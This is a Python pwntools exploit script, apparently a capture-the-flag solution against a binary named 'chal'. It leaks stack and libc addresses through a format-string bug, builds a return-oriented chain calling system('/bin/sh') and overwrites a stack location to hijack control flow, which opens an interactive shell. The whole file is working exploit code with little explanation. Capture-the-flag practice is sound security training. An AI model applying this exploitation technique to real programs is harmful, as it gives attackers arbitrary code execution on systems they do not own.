
#!/usr/bin/env python3
from pwn import *

p = process("./chal")
# p = remote("challenge.secso.cc", 9003)
elf = ELF("./chal")
libc = ELF("./libc.so.6")

        
stack_address_offset = 20
leak_address_offset = 21

# Leak address
p.sendlineafter(b"Please state your name:", str(f"%{stack_address_offset}$p %{leak_address_offset}$p").encode())
line = p.recvlines(2)[1].strip()

libc_address = int(line.split(b" ")[4], 16)
stack_addr = int(line.split(b" ")[3], 16)

libc_base = libc_address - 0x2a1ca

info("libc address: %#x", libc_address)
info("libc base: %#x", libc_base)
info("stack address: %#x", stack_addr)

# Prepare
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))
system_addr = libc_base + libc.symbols["system"]

# ROPgadget --binary ./libc.so.6 | grep "pop rdi"
pop_rdi = libc_base + 0x000000000010f75b

info("bin_sh_addr: %#x", bin_sh_addr)
info("system_addr: %#x", system_addr)
info("pop_rdi: %#x", pop_rdi)

# Send our payload into the stack 
p.sendlineafter(b"fact about yourself:", p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr))

# Next jump stack (stack leaked) - (main+297)
stack_main_addr = stack_addr - 0x118

p.sendlineafter(b"Where would you like to place your hole?", hex(stack_main_addr).encode())
p.sendlineafter(b"to write there?", b"138") # ret on main address
        
p.interactive()